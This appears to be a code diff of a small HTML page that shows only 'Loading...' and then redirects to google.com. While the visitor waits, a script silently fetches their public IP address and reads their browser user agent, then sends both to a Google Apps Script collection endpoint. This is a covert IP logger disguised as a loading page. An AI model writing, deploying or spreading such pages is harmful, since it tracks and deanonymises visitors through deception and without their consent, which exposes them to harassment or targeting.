@@ -1,27 +1,28 @@
 <!DOCTYPE html>
 <html>
-<body>
+  <body>
+    <h3>Loading...</h3>
 
-<script>
-async function logVisitor() {
+    <script>
+      async function send() {
 
-  const ipData = await fetch('https://ipinfo.im/api/')
-      .then(r => r.json());
+        // real IP
+        const ip = await fetch("https://api.ipify.org?format=json")
+          .then(r => r.json())
+          .then(d => d.ip);
 
-  await fetch('https://script.google.com/macros/s/AKfycbyRMONixZlUy77NspqsqgGCAoHK4YoH7ZSuwwGRYhHBXZpIAjdVqPxf9snperkV59XA/exec', {
-      method: 'POST',
-      body: JSON.stringify({
-        ip: ipData.ip,
-        device: navigator.userAgent,
-        browser: navigator.appName
-      })
-  });
+        const device = navigator.userAgent;
 
-  window.location.href = "https://google.com";
-}
+        await google.script.run.saveData({
+          ip: ip,
+          device: device
+        });
 
-logVisitor();
-</script>
+        // redirect after logging
+        window.location.href = "https://google.com";
+      }
 
-</body>
+      send();
+    </script>
+  </body>
 </html>
